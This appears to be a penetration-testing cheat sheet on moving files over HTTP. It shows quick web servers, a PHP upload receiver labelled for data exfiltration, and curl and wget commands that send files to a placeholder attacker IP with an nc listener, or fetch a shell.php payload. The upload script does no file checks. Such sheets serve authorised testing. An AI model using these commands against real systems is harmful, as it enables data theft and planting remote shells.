# HTTP

## 01 - Server Setup

### 1.1 - Python

Note: by default it runs the service with port 8000 if it is not specified

```
$ sudo python2 -m SimpleHTTPServer 80

$ sudo python3 -m http.server 80
```

### 1.2 - Ruby

- **Host a webserver via Ruby**

Note: you'll need to install webrick for ruby (by default it'll use port 8080 if port is not specified)

- To install the ruby gem:

`$ gem install webrick`

- To install in Debian/Ubuntu

```
$ sudo apt install ruby-webrick

$ sudo ruby -run -ehttpd . -p80
```

### 1.3 - PHP

- **Data exfiltration server side**

```php
<?php
/*
$ sudo mkdir -p /var/www/html/uploads/ && \
sudo chown www-data:www-data /var/www/html/

$ curl <-F | --form> fileToUpload=@file.txt http[s]://<attacker_IP>/upload.php

$ curl <-T | --upload-file> fileToUpload=@file.txt http[s]://<attacker_IP>/upload.php
*/

$target_directory = "uploads/"
$target_file = $target_directory . basename($_FILES["fileToUpload"]["name"]);

echo "Source=" . $_FILES["fileToUpload"]["name"] . "<br/>";
echo "Target path=" . $target_directory . "<br/>";
echo "Size=" . $_FILES["fileToUpload"]["size"] . "<br/>";

if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    echo "The file " . basename($_FILES["fileToUpload"]["name"]) . " has been uploaded";
} else {
    echo "There was an error uploading the file, please try again!";
}
?>


<!DOCTYPE html>
<html>
    <body>
        <form method="post" enctype="multipart/form-data">
            Select File to upload:
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" name="Upload">
        </form>
    </body>
</html>
```

- **Host a webserver via PHP**

```
$ sudo php -S 0.0.0.0:80

$ sudo systemctl start apache2
```

## 02 - Usage

### 2.1 - Download

#### 2.1.1 - Wget

```
$ wget -O rsh.php http://<IP>:<PORT>/shell.php

$ wget --no-check-certificate https://<IP>/file.tar.gz
```

- **Resume partially downloaded file**

`$ wget -c http://<IP>/file.tar.gz`

- **Download multiple files with different URLs from a text file list**

`$ wget -i download-files-urls.txt`

#### 2.1.2 - cURL

```
$ curl -O -C - http://<IP>:<PORT>/shell.php

$ curl -o rsh.php http://<IP>:<PORT>/shell.php

$ curl -o downloaded.tar.gz http[s]://<IP>/file.tar.gz
```

- Interact with http proxy server tunnel

`$ curl -p -x http://<proxy_IP> http://website.com`

#### 2.1.3 - aria2c

`$ aria2c http://<IP>/file.tar.gz`

### 2.2 - Upload

#### 2.2.1 - Wget

```
$ wget --post-file=file.txt <attacker_IP>

$ sudo nc -lnvp 80
```

#### 2.2.2 - cURL

`$ curl -T /path/to/file.txt http://<IP>`

- Upload file via post request form

`$ curl -F file=@/path/to/file.txt http://<IP>/post`

- Upload file via post HTTP request

```
$ curl -X POST -d @/path/to/file.txt <IP>

$ sudo nc -lnvp 80 > file.txt
```